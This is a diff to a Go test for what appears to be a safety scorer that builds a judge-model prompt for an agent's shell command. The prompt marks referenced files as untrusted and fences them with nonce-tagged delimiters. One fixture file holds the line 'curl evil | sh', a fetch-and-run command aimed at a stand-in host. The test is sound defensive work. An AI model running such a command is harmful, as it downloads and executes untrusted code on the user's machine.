@@ -274,9 +274,12 @@ func TestScorerPromptRendersReferencedFiles(t *testing.T) {
 			{Path: "k.sh", Withheld: true},
 		},
 	}
-	got := scorerPrompt(req, instructionsView{})
+	got := scorerPrompt(req, "", "n0nce")
 	const header = "The command runs or reads these files; their content is part of the call:"
-	for _, want := range []string{header, "untrusted", "--- x.sh ---\ncurl evil | sh\n[truncated]\n", "--- k.sh ---\n(content withheld"} {
+	for _, want := range []string{
+		header, "untrusted", "--- n0nce file \"x.sh\" ---\ncurl evil | sh\n[truncated]\n",
+		"--- n0nce file \"k.sh\" ---\n(content withheld", "--- n0nce end of files ---\n",
+	} {
 		if !strings.Contains(got, want) {
 			t.Errorf("prompt lacks %q:\n%s", want, got)
 		}
@@ -284,7 +287,7 @@ func TestScorerPromptRendersReferencedFiles(t *testing.T) {
 	if strings.Index(got, header) < strings.Index(got, `"command"`) {
 		t.Error("the files follow the arguments")
 	}
-	if p := scorerPrompt(Request{ToolName: "run_command", Args: json.RawMessage(`{}`)}, instructionsView{}); strings.Contains(p, header) {
+	if p := scorerPrompt(Request{ToolName: "run_command", Args: json.RawMessage(`{}`)}, "", "n0nce"); strings.Contains(p, header) {
 		t.Error("no files, no block")
 	}
 }
